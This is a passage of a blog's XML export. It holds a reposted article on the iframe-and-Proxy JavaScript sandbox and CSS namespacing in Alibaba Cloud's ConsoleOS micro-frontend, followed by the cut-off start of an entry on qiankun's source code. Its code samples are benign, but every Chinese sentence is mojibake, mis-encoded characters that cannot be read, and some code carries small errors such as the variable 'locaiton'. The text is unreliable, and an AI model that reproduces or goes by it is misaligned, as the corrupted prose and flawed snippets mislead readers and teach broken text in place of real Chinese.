    <url>%2F2020%2F05%2F29%2FWeb%E5%89%8D%E7%AB%AF%2F%E9%98%BF%E9%87%8C%E4%BA%91%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E5%BE%AE%E5%89%8D%E7%AB%AF%E6%96%B9%E6%A1%88%E7%9A%84%E6%B2%99%E7%AE%B1%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œ Alibaba F2Eï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/yXi1jYACrDAFqT7IKv3a5w å¯¼è¯»ï¼šå¾®å‰ç«¯å·²ç»æˆä¸ºå‰ç«¯é¢†åŸŸå¦‚ä»Šæ¯”è¾ƒç«çˆ†çš„è¯é¢˜ï¼Œå…³äºå¾®å‰ç«¯ä»·å€¼çš„è®¨è®ºï¼Œå¯ä»¥å‚è€ƒå…‹å†›çš„ã€Šæ‹¥æŠ±äº‘æ—¶ä»£çš„å‰ç«¯å¼€å‘æ¡†æ¶â€”â€”å¾®å‰ç«¯ã€‹ã€‚å¾®å‰ç«¯åœ¨æŠ€æœ¯æ–¹é¢ï¼Œæœ‰ä¸€ä¸ªå§‹ç»ˆç»•ä¸è¿‡å»è¯é¢˜å°±æ˜¯å‰ç«¯æ²™ç®±ã€‚æœ¬ç¯‡å…·ä½“æ¢è®¨ä¸€ä¸‹ï¼Œåœ¨å¾®å‰ç«¯é¢†åŸŸå¦‚ä½•å®ç°å‰ç«¯æ²™ç®±ã€‚ èƒŒæ™¯ åº”ç”¨æ²™ç®±å¯èƒ½æ˜¯å¾®å‰ç«¯æŠ€æœ¯ä½“ç³»é‡Œé¢æœ€æœ‰æ„æ€çš„éƒ¨åˆ†ã€‚ä¸€èˆ¬æ¥è¯´æ²™ç®±æ˜¯å¾®å‰ç«¯æŠ€æœ¯ä½“ç³»ä¸­ä¸æ˜¯å¿…é¡»è¦åšçš„äº‹æƒ…ï¼Œå› ä¸ºå¦‚æœè§„èŒƒåšçš„è¶³å¤Ÿå¥½ï¼Œæ˜¯èƒ½å¤Ÿé¿å…æ‰ä¸€äº›å˜é‡å†²çªè¯»å†™ï¼ŒCSS æ ·å¼å†²çªçš„æƒ…å†µã€‚ä½†æ˜¯å¦‚æœä½ åœ¨ä¸€ä¸ªè¶³å¤Ÿå¤§çš„ä½“ç³»ä¸­ï¼Œæ€»ä¸èƒ½ä»…ä»…é€šè¿‡è§„èŒƒæ¥ä¿è¯åº”ç”¨çš„å¯é æ€§ï¼Œè¿˜æ˜¯éœ€è¦æŠ€æœ¯æ‰‹æ®µå»æ²»ç†è¿è¡Œæ—¶çš„ä¸€äº›å†²çªé—®é¢˜ï¼Œè¿™ä¸ªä¹Ÿæ˜¯æ²™ç®±æ–¹æ¡ˆæˆä¸ºå¾®å‰ç«¯æŠ€æœ¯ä½“ç³»çš„ä¸€éƒ¨åˆ†åŸå› ã€‚ é¦–å…ˆçºµè§‚å„ç±»æŠ€æœ¯æ–¹æ¡ˆï¼Œæœ‰ä¸€ä¸ªå¤§å‰æå†³å®šäº†è¿™ä¸ªæ²™ç®±å¦‚ä½•åšï¼šæœ€ç»ˆå¾®åº”ç”¨æ˜¯ å•å®ä¾‹ or å¤šå®ä¾‹ å­˜åœ¨å®¿ä¸»åº”ç”¨ä¸­ã€‚è¿™ä¸ªç›´æ¥å†³å®šäº†è¿™ä¸ªæ²™ç®±çš„å¤æ‚åº¦å’ŒæŠ€æœ¯æ–¹æ¡ˆã€‚ å•å®ä¾‹ï¼šåŒä¸€ä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªå¾®åº”ç”¨å®ä¾‹å­˜åœ¨ï¼Œæ­¤åˆ»æµè§ˆå™¨æ‰€æœ‰æµè§ˆå™¨èµ„æºéƒ½æ˜¯è¿™ä¸ªåº”ç”¨ç‹¬å çš„ï¼Œæ–¹æ¡ˆè¦è§£å†³çš„å¾ˆå¤§ç¨‹åº¦æ˜¯åº”ç”¨åˆ‡æ¢çš„æ—¶å€™çš„æ¸…ç†å’Œç°åœºæ¢å¤ã€‚æ¯”è¾ƒè½»é‡ï¼Œå®ç°èµ·æ¥ä¹Ÿç®€å•ã€‚ å¤šå®ä¾‹ï¼šèµ„æºä¸æ˜¯åº”ç”¨ç‹¬å ï¼Œå°±è¦è§£å†³èµ„æºå…±äº«çš„æƒ…å†µï¼Œæ¯”å¦‚è·¯ç”±ï¼Œæ ·å¼ï¼Œå…¨å±€å˜é‡è¯»å†™ï¼ŒDOM. å¯èƒ½éœ€è¦è€ƒè™‘çš„æƒ…å†µæ¯”è¾ƒå¤šï¼Œå®ç°è¾ƒä¸ºå¤æ‚ã€‚ æœ€å¼€å§‹æˆ‘ä»¬çš„æƒ³æ³•æ˜¯ï¼š ä»ä¸šåŠ¡åœºæ™¯ï¼šæˆ‘ä»¬å¯èƒ½å­˜åœ¨çš„æƒ…å†µæ˜¯å½“ç”¨æˆ·æ“ä½œä¸€ä¸ªäº§å“ A çš„åŒæ—¶å’Œå¦ä¸€ä¸ªäº§å“ B å‘ç”Ÿäº†å…³è”æ“ä½œï¼Œéœ€è¦å”¤é†’åº”ç”¨ B åšæ“ä½œã€‚è™½ç„¶ä»äº§å“ç»´åº¦å¯ä»¥è§„é¿æ‰ï¼Œæ¯”å¦‚å…ˆåˆ‡åˆ° B, ç„¶ååˆ‡å› A, ä½†æ˜¯ä»æŸç§ç¨‹åº¦ä¸Šå› ä¸ºæŠ€æœ¯çš„åŸå› ï¼Œæˆ‘ä»¬é™åˆ¶äº†äº§å“äº¤äº’çš„å‘æŒ¥ã€‚ ä»æŠ€æœ¯è§’åº¦ï¼šè§£å†³äº†å¤šå®ä¾‹å½“ç„¶å•å®ä¾‹çš„åœºæ™¯ä¹Ÿä¸åœ¨è¯ä¸‹ï¼Œå¹¶ä¸”å•å®ä¾‹çš„æ–¹æ¡ˆæŸç§ç¨‹åº¦ä¸Šç»™ç¼–ç ä¸Šå¸¦æ¥äº†ä¸€å®šå¤æ‚åº¦ï¼Œæ¯”å¦‚ä¸šåŠ¡ä»£ç éœ€è¦è‡ªå·±åšä¸šåŠ¡ä¸Šä¸‹æ–‡çš„åˆ‡æ¢ã€‚ æœ€è¿‘ qiankun 2 ä¹Ÿè½¬å˜äº†æ€è·¯ä»å•å®ä¾‹çš„æ”¯æŒåˆ°å¼€å§‹æ”¯æŒå¤šå®ä¾‹ï¼Œå¤šå¤šå°‘å°‘ä¹Ÿä¾§é¢è¯´æ˜äº†ï¼Œå¤šå®ä¾‹æ˜¯ä¸ªä¸€ä¸ªå€¼å¾—æŠ•å…¥å’ŒæŠ€æœ¯æ”»å…‹çš„åœºæ™¯ã€‚ åŸºäºä¸Šé¢çš„è€ƒé‡ï¼Œæˆ‘ä»¬å°±å¼€å§‹äº†æˆ‘ä»¬ Browser VM æ²™ç®±çš„å®ç°æ¢ç´¢ã€‚æ€»ç»“èµ·æ¥å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š JavaScript æ²™ç®±å®ç° æ²™ç®±ç¯å¢ƒæ„é€  è¦å®ç°æ²™ç®±ï¼Œæˆ‘ä»¬éœ€è¦éš”ç¦»æ‰æµè§ˆå™¨çš„åŸç”Ÿå¯¹è±¡ï¼Œä½†æ˜¯å¦‚ä½•éš”ç¦»ï¼Œå»ºç«‹ä¸€ä¸ªæ²™ç®±ç¯å¢ƒå‘¢ï¼ŸNode ä¸­ æœ‰ vm æ¨¡å—ï¼Œæ¥å®ç°ç±»ä¼¼çš„èƒ½åŠ›ï¼Œä½†æ˜¯æµè§ˆå™¨å°±ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨äº†é—­åŒ…çš„èƒ½åŠ›ï¼Œåˆ©ç”¨å˜é‡ä½œç”¨åŸŸå»æ¨¡æ‹Ÿä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç : 1234567function foo(window) &#123; console.log(window.document);&#125;foo(&#123; document: &#123;&#125;;&#125;); æ¯”å¦‚è¿™æ®µä»£ç çš„è¾“å‡ºä¸€å®šæ˜¯ {}. è€Œä¸æ˜¯åŸç”Ÿæµè§ˆå™¨çš„ document. æ‰€ä»¥ ConsoleOS å®ç°äº†ä¸€ä¸ª wepback çš„æ’ä»¶åœ¨åº”ç”¨ä»£ç æ„å»ºçš„æ—¶å€™ç»™å­åº”ç”¨ä»£ç åŠ ä¸Šä¸€å±‚ wrap ä»£ç ï¼Œåˆ›å»ºä¸€ä¸ªé—­åŒ…ï¼ŒæŠŠéœ€è¦éš”ç¦»çš„æµè§ˆå™¨åŸç”Ÿå¯¹è±¡å˜æˆä»ä¸‹é¢å‡½æ•°é—­åŒ…ä¸­è·å–çš„ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥åœ¨åº”ç”¨åŠ è½½çš„æ—¶å€™ï¼Œä¼ å…¥æ¨¡æ‹Ÿæ‰çš„ windowï¼Œdocument ä¹‹ç±»çš„å¯¹è±¡ã€‚ 123456// æ‰“åŒ…ä»£ç __CONSOLE_OS_GLOBAL_HOOK__(id, function (require, module, exports, &#123;window, document, location, history&#125;) &#123; /* æ‰“åŒ…ä»£ç  */&#125;)function __CONSOLE_OS_GLOBAL_HOOK__(id, entry) &#123; entry(require, module, exports, &#123;window, document, location, history&#125;)&#125; å½“ç„¶ä¹Ÿå¯ä»¥ä¸é å·¥ç¨‹åŒ–çš„æ‰‹æ®µæ¥å®ç°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¯·æ±‚è„šæœ¬ï¼Œç„¶ååœ¨è¿è¡Œæ—¶æ‹¼æ¥è¿™æ®µä»£ç ï¼Œç„¶åeval æˆ–è€… new Function, æ¥è¾¾åˆ°ç›¸åŒçš„ç›®çš„ã€‚ åŸç”Ÿå¯¹è±¡æ¨¡æ‹Ÿ æ²™ç®±éš”ç¦»èƒ½åŠ›æœ‰äº†ï¼Œå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å®ç°è¿™ä¸€å †æµè§ˆå™¨çš„åŸç”Ÿå¯¹è±¡äº†ã€‚æœ€å¼€å§‹çš„æƒ³æ³•æ˜¯æˆ‘ä»¬æ ¹æ® ECMA çš„è§„èŒƒå®ç°ï¼ˆç°åœ¨ä»ç„¶æœ‰ç±»ä¼¼çš„æƒ³æ³•ï¼‰ï¼Œä½†æ˜¯å‘ç°æˆæœ¬å¤ªé«˜ã€‚ä¸è¿‡åœ¨æˆ‘ä»¬å„ç§å®éªŒä¹‹åï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆâ€œå–å·§â€çš„åšæ³•ï¼Œæˆ‘ä»¬å¯ä»¥ new iframe å¯¹è±¡ï¼ŒæŠŠé‡Œé¢çš„åŸç”Ÿæµè§ˆå™¨å¯¹è±¡é€šè¿‡ contentWindow å–å‡ºæ¥ï¼Œåº”ä¸ºè¿™äº›å¯¹è±¡å¤©ç„¶éš”ç¦»ï¼Œå°±çœå»äº†è‡ªå·±å®ç°çš„æˆæœ¬ã€‚ 1const iframe = document.createElement( &apos;iframe&apos; ); å½“ç„¶é‡Œé¢æœ‰å¾ˆå¤šçš„ç»†èŠ‚éœ€è¦è€ƒé‡ï¼Œæ¯”å¦‚ï¼š åªæœ‰åŒåŸŸçš„ iframe æ‰èƒ½å–å‡ºå¯¹åº”çš„çš„ contentWindow. æ‰€ä»¥éœ€è¦æä¾›ä¸€ä¸ªå®¿ä¸»åº”ç”¨ç©ºçš„åŒåŸŸURLæ¥ä½œä¸ºè¿™ä¸ª iframe åˆå§‹åŠ è½½çš„ URL. å½“ç„¶æ ¹æ® HTML çš„è§„èŒƒ è¿™ä¸ª URL ç”¨äº† about:blank ä¸€å®šä¿è¯ä¿è¯åŒåŸŸï¼Œä¹Ÿä¸ä¼šå‘ç”Ÿèµ„æºåŠ è½½ï¼Œä½†æ˜¯ä¼šå‘ç”Ÿå…³è”çš„ å’Œ è¿™ä¸ªiframe ä¸­å…³è”çš„ history ä¸èƒ½è¢«æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™è·¯ç”±çš„å˜æ¢åªèƒ½å˜æˆ hash æ¨¡å¼ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å–å‡ºå¯¹åº”çš„ iframe ä¸­åŸç”Ÿçš„å¯¹è±¡ä¹‹åï¼Œå°±ä¼šå¯¹ç‰¹å®šéœ€è¦éš”ç¦»çš„å¯¹è±¡ç”Ÿæˆå¯¹åº”çš„ Proxy, ç„¶åå¯¹ä¸€äº›å±æ€§è·å–å’Œå±æ€§è®¾ç½®ï¼Œåä¸Šä¸€äº›ç‰¹å®šçš„è®¾ç½®ï¼Œæ¯”å¦‚ window.document éœ€è¦è¿”å›ç‰¹å®šçš„æ²™ç®± document è€Œä¸æ˜¯å½“å‰æµè§ˆå™¨çš„document. 12345678910111213141516171819202122class Window &#123; constructor(options, context, frame) &#123; return new Proxy(frame.contentWindow, &#123; set(target, name, value) &#123; target[name] = value; return true; &#125;, get(target, name) &#123; switch( name ) &#123; case &apos;document&apos;: return context.document; default: &#125; if( typeof target[ name ] === &apos;function&apos; &amp;&amp; /^[a-z]/.test( name ) )&#123; return target[ name ].bind &amp;&amp; target[ name ].bind( target ); &#125; else&#123; return target[ name ]; &#125; &#125; &#125;); &#125;&#125; å¯¹äºæ¯ä¸€ä¸ªå¯¹è±¡çš„å®ç°è¿™é‡Œä¸è®²ç»†èŠ‚äº†ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹æˆ‘ä»¬çš„å¼€æºä¹‹åçš„ä»£ç  (https://github.com/aliyun/alibabacloud-console-os/tree/master/packages/browser-vm) ä½†æ˜¯ä¸ºäº†æ–‡æ¡£èƒ½å¤Ÿè¢«åŠ è½½åœ¨åŒä¸€ä¸ª DOM æ ‘ä¸Šï¼Œå¯¹äº document, å¤§éƒ¨åˆ†çš„ DOM æ“ä½œçš„å±æ€§å’Œæ–¹æ³•è¿˜æ˜¯ç›´æ¥ç”¨çš„å®¿ä¸»æµè§ˆå™¨ä¸­çš„ document çš„å±æ€§å’Œæ–¹æ³•ã€‚ ç”±äºå­åº”ç”¨æœ‰è‡ªå·±çš„æ²™ç®±ç¯å¢ƒï¼Œä¹‹å‰æ‰€æœ‰ç‹¬å å¼çš„èµ„æºç°åœ¨éƒ½å˜æˆäº†åº”ç”¨ç‹¬äº«ï¼ˆå°¤å…¶æ˜¯ location, historyï¼‰ï¼Œæ‰€ä»¥å­åº”ç”¨ä¹Ÿèƒ½åŒæ—¶è¢«åŠ è½½. å¹¶ä¸”å¯¹äºä¸€äº›å˜é‡çš„æˆ‘ä»¬è¿˜èƒ½åœ¨ proxy ä¸­è®¾ç½®ä¸€äº›è®¿é—®æƒé™çš„äº‹æƒ…ï¼Œä»è€Œé™åˆ¶å­åº”ç”¨çš„èƒ½åŠ›ï¼Œæ¯”å¦‚ Cookieï¼Œ LocalStoage è¯»å†™ã€‚ å½“è¿™ä¸ª iframe è¢«ç§»é™¤æ—¶ï¼Œå†™åœ¨ window çš„å˜é‡å’Œè®¾ç½®çš„ä¸€äº› timeout æ—¶é—´ä¹Ÿä¼šä¸€å¹¶è¢«ç§»é™¤ã€‚ï¼ˆå½“ç„¶ DOM äº‹ä»¶éœ€è¦æ²™ç®±è®°å½•ï¼Œç„¶ååœ¨å®¿ä¸»ä¸­ç§»é™¤ï¼‰ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬çš„æ²™ç®±å¯ä»¥åšåˆ°å¦‚ä¸‹çš„ç‰¹æ€§ï¼š CSS éš”ç¦» CSS éš”ç¦»æ–¹æ¡ˆç›¸å¯¹æ¥è¯´æ¯”è¾ƒå¸¸è§„ï¼Œå¸¸è§çš„æœ‰ï¼š CSS Module æ·»åŠ  css çš„ namespace Dynamic StyleSheet Shadow DOM CSS Module or CSS Namespace: é€šè¿‡ä¿®æ”¹åŸºç¡€ç»„ä»¶æ ·å¼å‰ç¼€æ¥å®ç°æ¡†æ¶å’Œå¾®åº”ç”¨ä¾èµ–åŸºç¡€ç»„ä»¶æ ·å¼çš„éš”ç¦»æ€§ï¼ˆä¾èµ–äºå·¥ç¨‹ä¸Š CSS çš„é¢„å¤„ç†å™¨ç¼–è¯‘å’Œè¿è¡Œæ—¶åŸºç¡€ç»„ä»¶åº“é…ç½®ï¼‰ï¼ŒåŒæ—¶é¿å…å…¨å±€æ ·å¼çš„ä¹¦å†™ï¼ˆä¾èµ–äºçº¦å®šæˆ–å·¥ç¨‹ lint æ‰‹æ®µï¼‰ Dynamic StyleSheet: éš”ç¦»æ–¹å¼æ˜¯é€šè¿‡jsè¿è¡Œæ—¶åŠ¨æ€åŠ è½½å¸è½½å¾®åº”ç”¨æ ·å¼è¡¨æ¥é¿å…æ ·å¼çš„å†²çªï¼Œå±€é™æ€§ä¸€æ˜¯åœ¨äºç«™ç‚¹æ¡†æ¶æœ¬èº«æˆ–å…¶éƒ¨ä»¶ï¼ˆheader/menu/footerï¼‰ä¸å½“å‰è¿è¡Œçš„å¾®åº”ç”¨é—´ä»å­˜åœ¨æ ·å¼å†²çªçš„å¯èƒ½æ€§ï¼ŒäºŒæ˜¯æ²¡æœ‰åŠæ³•æ”¯æŒå¤šä¸ªå¾®åº”ç”¨åŒæ—¶è¿è¡Œæ˜¾ç¤ºçš„æƒ…å†µ Shadow DOM: ä¼˜ç‚¹æ˜¯æµè§ˆå™¨çº§åˆ«æä¾›çš„æ ·å¼éš”ç¦»èƒ½åŠ›ï¼Œå¯ä»¥åšåˆ°å®Œå…¨éš”ç¦»ã€‚ç¼ºç‚¹åœ¨äºï¼Œç›®å‰å…¼å®¹æ€§è¿˜æ˜¯å¤Ÿä¸å¤ªå¥½ï¼Œå¹¶ä¸”æ”¹é€ ä¼šæ¶‰åŠåˆ°æ—§åº”ç”¨çš„ä¸šåŠ¡ä»£ç çš„æ”¹é€ ï¼Œå¯¹å­åº”ç”¨ä¾µå…¥æ€§æ¯”è¾ƒé«˜ã€‚ æœ€ç»ˆç»è¿‡å®è·µï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ–¹å¼æ˜¯ CSS Module + æ·»åŠ  CSS çš„ namespaceã€‚CSS module ä¿è¯çš„æ˜¯åº”ç”¨ä¸šåŠ¡æ ·å¼ä¸å†²çªï¼ŒNamespace ä¿è¯å…¬å…±åº“ä¸å†²çªã€‚æˆ‘ä»¬å®ç°äº†ä¸€ä¸ª postcss æ’ä»¶ï¼Œä¼šåœ¨åº”ç”¨æ„å»ºçš„æ—¶å€™ç»™æ‰€æœ‰çš„æ ·å¼éƒ½åŠ ä¸Šåº”ç”¨å‰ç¼€åŒ…æ‹¬åº”ç”¨å…¬å…±åº“çš„ CSSã€‚ï¼ˆè¿™æ ·æ–¹ä¾¿åšåˆ°åŒä¸€ä¸ª ç»„ä»¶åº“ æ–°æ—§ç‰ˆæœ¬æ ·å¼çš„å…¼å®¹ï¼‰ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 12345678// å®¿ä¸» host app.next-btn &#123; color: #eee;&#125;// å­åº”ç”¨ sub appaliyun-slb .next-btn &#123; color: #eee;&#125;//å®¿ä¸»ä¸­ç”Ÿæˆçš„èŠ‚ç‚¹&lt;aliyun-slb&gt; &lt;!-- å­åº”ç”¨çš„èŠ‚ç‚¹ --&gt;&lt;/aliyun-slb&gt; è¿™æ ·å®ç°çš„å¥½å¤„åœ¨äºï¼š æ¯ä¸ªåº”ç”¨éƒ½æœ‰ namespace, å¯ä»¥å¤šå®ä¾‹å…±å­˜ã€‚ ä¸ä¾èµ–ç‰¹å®šçš„ CSS é¢„å¤„ç†å™¨ã€‚ å¯¹äºåŒä¸€ä¸ªåº“ä¸åŒç‰ˆæœ¬çš„ CSSï¼ˆå¦‚ fusion1 å’Œ fusion2ï¼‰, å¯ä»¥åšåˆ°å½»åº•éš”ç¦»ã€‚ é‰´äºä¸Šé¢ JS æ²™ç®±çš„å­˜åœ¨ï¼Œå¯¹äºä¸€äº›å¼¹çª—ç±»çš„ç»„ä»¶ï¼Œè¿™ä¸ªå¾®åº”ç”¨è·å–çš„ body å®é™…ä¸Šæ˜¯å®¿ä¸»ç”Ÿæˆçš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥å¼¹çª—ä¼šè¢«æ·»åŠ åˆ°å¾®åº”ç”¨çš„èŠ‚ç‚¹ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢çš„ aliyun-slbï¼‰è¿™ä¸ªèŠ‚ç‚¹ï¼Œæ ·å¼ä¸ä¼šå¤±æ•ˆã€‚ ä¸è¿‡ä¹Ÿä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚ï¼š åµŒå¥—åº”ç”¨ç»„ä»¶æ ·å¼ä¼˜å…ˆçº§çš„é—®é¢˜ã€‚ï¼ˆç”±äº CSS module çš„å­˜åœ¨ï¼Œä¸€èˆ¬åªä¼šå‘ç”Ÿåœ¨å…¬å…± css æ ·å¼ä¸­ï¼Œè¿™ä¸ªå°±æ˜¯åªèƒ½å°½é‡é¿å…åµŒå¥—ï¼‰ã€‚ fusion ä¸åŒç‰ˆæœ¬åº“å…¬ç”¨å­—ä½“çš„é—®é¢˜ã€‚ï¼ˆç›®å‰è§£æ³•æ¯”è¾ƒhack, å·¥ç¨‹åŒ–æ‰‹æ®µæ›¿æ¢æ‰äº† next å­—ä½“çš„åå­—ï¼‰ã€‚ å¦‚ä½•å’Œå…¶ä»–ä½“ç³»ç»“åˆ ä¸€èˆ¬æ¥è¯´ï¼Œæ‰€ä»¥å¦‚æœçœ‹å®Œä¸Šé¢çš„æ–‡ç« ï¼Œè§‰å¾—è¿™ä¸ªæ²™ç®±æ–¹æ¡ˆä¸é”™ï¼Œä½†æ˜¯åˆæœ‰è‡ªå·±çš„å¾®å‰ç«¯ä½“ç³»äº†ï¼Œæƒ³å¥—ç”¨å’‹åŠï¼Ÿ ç›®å‰ ConsoleOS çš„ä»£ç å·²ç»åœ¨ Github ä¸Šå¼€æºï¼ˆhttp://github.com/aliyun/alibabacloud-console-osï¼‰ï¼Œè¿™é‡Œä¸å¦¨å¯ä»¥å°è¯•è¯•ç”¨ä¸€ä¸‹ã€‚ JS æ²™ç®±éƒ¨åˆ† å¦‚æœçœ‹æ‡‚äº†ä¸Šé¢å…³äºåŸç†çš„ä»‹ç»å¯ä»¥çœ‹åˆ°å…¶å®æ²™ç®±å®ç°åŒ…æ‹¬ä¸¤ä¸ªå±‚é¢ åŸç”Ÿæµè§ˆå™¨å¯¹è±¡çš„æ¨¡æ‹Ÿï¼ˆBrowser-VMï¼‰çš„éƒ¨åˆ† å¦‚ä½•æ„å»ºä¸€ä¸ªé—­åŒ…ç¯å¢ƒçš„éƒ¨åˆ†ã€‚ Browser-VM å¯ä»¥ç›´æ¥ç”¨èµ·æ¥ï¼Œè¿™éƒ¨åˆ†å®Œå…¨æ˜¯é€šç”¨æ™®é€‚çš„ã€‚ä½†æ˜¯æ¶‰åŠåˆ°é—­åŒ…æ„å»ºçš„è¿™éƒ¨åˆ†ï¼Œæ¯ä¸ªå¾®å‰ç«¯ä½“ç³»ä¸å¤ªä¸€è‡´ï¼Œå¯èƒ½éœ€è¦æ”¹é€ æ¯”å¦‚ï¼š 1234567891011121314151617import &#123; createContext, removeContext &#125; from &apos;@alicloud/console-os-browser-vm&apos;;const context = await createContext();const run = window.eval(` (() =&gt; function(&#123;window, history, locaiton, document&#125;) &#123; window.test = 1; &#125;)()`)run(context);console.log(context.window.test);console.log(window.test);// æ“ä½œè™šæ‹ŸåŒ–æµè§ˆå™¨å¯¹è±¡context.history.pushState(null, null, &apos;/test&apos;);context.locaiton.hash = &apos;foo&apos;// é”€æ¯ä¸€ä¸ª contextawait removeContext( context ); å½“ç„¶å¯ä»¥ç›´æ¥é€‰æ‹©æ²™ç®±æä¾›å¥½çš„ evalScripts æ–¹æ³•ï¼š 12345import &#123; evalScripts &#125; from &apos;@alicloud/console-os-browser-vm&apos;;const context = evalScripts(&apos;window.test = 1;&apos;)console.log(window.test === undefined) // true CSS æ²™ç®± å¦‚æœç”¨webpack æ„å»ºï¼Œå¯ä»¥ç›´æ¥é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223const postcssWrap = require(&apos;@alicloud/console-toolkit-plugin-os/lib/postcssWrap&apos;)// ä¸‹é¢æ˜¯ webpack config&#123; test: /\.css$/, use: [ &apos;style-loader&apos;, &#123; loader: &apos;postcss-loader&apos;, options: &#123; plugins: [ // åŠ å…¥æ’ä»¶ postcssWrap(&#123; stackableRoot: &apos;.prefix&apos;, repeat: 1 &#125;) ], &#125;, &#125;, &apos;css-loader&apos;, ], exclude: /^node_modules$/,&#125; Try Live Demo ä¸å…¶å¹²å·´å·´çš„çœ‹æ–‡ç« ï¼Œç›´æ¥è¯•è¯•åœ¨çº¿ Demo å¯èƒ½æ›´æœ‰ä½“æ„Ÿä¸€äº›ï¼š http://github.com/aliyun/alibabacloud-console-os#try-live-demo æˆ–è€…è¯•è¯•ç”Ÿäº§ç¯å¢ƒçš„ä¾‹å­, é˜¿é‡Œäº‘ä¼ä¸šå·¥ä½œå° - å·¥å…·åº”ç”¨ä¸­å¿ƒ (http://work.console.aliyun.com/), æ˜¯é˜¿é‡Œäº‘é›†æˆä¸‰æ–¹åº”ç”¨æä¾›äº‘ç®¡èƒ½åŠ›ã€‚è¿™é‡Œæ¯ä¸ªåº”ç”¨éƒ½æ˜¯ä¸€ä¸ªå¾®åº”ç”¨ï¼Œé‡Œé¢æ¶µç›–äº† React, Vue, Angular ä¸‰å¤§æŠ€æœ¯æ ˆã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>å¾®å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸‡å­—è§£æå¾®å‰ç«¯ã€å¾®å‰ç«¯æ¡†æ¶qiankunä»¥åŠæºç ]]></title>
    <url>%2F2020%2F05%2F29%2FWeb%E5%89%8D%E7%AB%AF%2F%E4%B8%87%E5%AD%97%E8%A7%A3%E6%9E%90%E5%BE%AE%E5%89%8D%E7%AB%AF%E3%80%81%E5%BE%AE%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6qiankun%E4%BB%A5%E5%8F%8A%E6%BA%90%E7%A0%81%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œ å‰ç«¯å¤§å…¨ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/o7L_Sxl1s0uKywRy-Ao5fg æœ¬æ–‡å°†é’ˆå¯¹å¾®å‰ç«¯æ¡†æ¶ qiankun çš„æºç è¿›è¡Œæ·±å…¥è§£æï¼Œåœ¨æºç è®²è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ å¾®å‰ç«¯ã€‚ å¾®å‰ç«¯ æ˜¯ä¸€ç§ç±»ä¼¼äºå¾®æœåŠ¡çš„æ¶æ„ï¼Œå®ƒå°†å¾®æœåŠ¡çš„ç†å¿µåº”ç”¨äºæµè§ˆå™¨ç«¯ï¼Œå³å°†å•é¡µé¢å‰ç«¯åº”ç”¨ç”±å•ä¸€çš„å•ä½“åº”ç”¨è½¬å˜ä¸ºå¤šä¸ªå°å‹å‰ç«¯åº”ç”¨èšåˆä¸ºä¸€çš„åº”ç”¨ã€‚å„ä¸ªå‰ç«¯åº”ç”¨è¿˜å¯ä»¥ç‹¬ç«‹å¼€å‘ã€ç‹¬ç«‹éƒ¨ç½²ã€‚åŒæ—¶ï¼Œå®ƒä»¬ä¹Ÿå¯ä»¥åœ¨å…±äº«ç»„ä»¶çš„åŒæ—¶è¿›è¡Œå¹¶è¡Œå¼€å‘â€”â€”è¿™äº›ç»„ä»¶å¯ä»¥é€šè¿‡ NPM æˆ–è€… Git Tagã€Git Submodule æ¥ç®¡ç†ã€‚ qiankunï¼ˆä¹¾å¤ï¼‰ å°±æ˜¯ä¸€æ¬¾ç”±èš‚èšé‡‘æœæ¨å‡ºçš„æ¯”è¾ƒæˆç†Ÿçš„å¾®å‰ç«¯æ¡†æ¶ï¼ŒåŸºäº single-spa è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œç”¨äºå°† Web åº”ç”¨ç”±å•ä¸€çš„å•ä½“åº”ç”¨è½¬å˜ä¸ºå¤šä¸ªå°å‹å‰ç«¯åº”ç”¨èšåˆä¸ºä¸€çš„åº”ç”¨ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ é‚£ä¹ˆï¼Œè¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬çš„æºç è§£ææ­£å¼å¼€å§‹ã€‚ åˆå§‹åŒ–å…¨å±€é…ç½® - start(opts)æˆ‘ä»¬ä»ä¸¤ä¸ªåŸºç¡€ API - registerMicroApps(apps, lifeCycles?) - æ³¨å†Œå­åº”ç”¨ å’Œ start(opts?) - å¯åŠ¨ä¸»åº”ç”¨ å¼€å§‹ï¼Œç”±äº registerMicroApps å‡½æ•°ä¸­è®¾ç½®çš„å›è°ƒå‡½æ•°è¾ƒå¤šï¼Œå¹¶ä¸”è¯»å–äº† start å‡½æ•°ä¸­è®¾ç½®çš„åˆå§‹é…ç½®é¡¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä» start å‡½æ•°å¼€å§‹è§£æã€‚ æˆ‘ä»¬ä» start 